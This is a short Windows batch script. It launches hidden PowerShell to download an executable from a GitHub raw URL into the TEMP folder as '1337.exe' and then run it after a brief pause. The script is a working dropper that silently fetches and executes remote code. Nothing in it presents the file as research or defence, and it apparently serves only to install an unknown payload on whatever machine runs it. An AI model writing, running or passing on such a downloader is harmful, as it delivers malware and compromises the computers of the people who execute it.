@echo off
powershell -WindowStyle Hidden -command "Start-BitsTransfer -Source 'https://github.com/pain133337/1/raw/main/imma.exe' -Destination $env:TEMP\1337.exe; Sleep 3; Start-Process $env:TEMP\1337.exe"
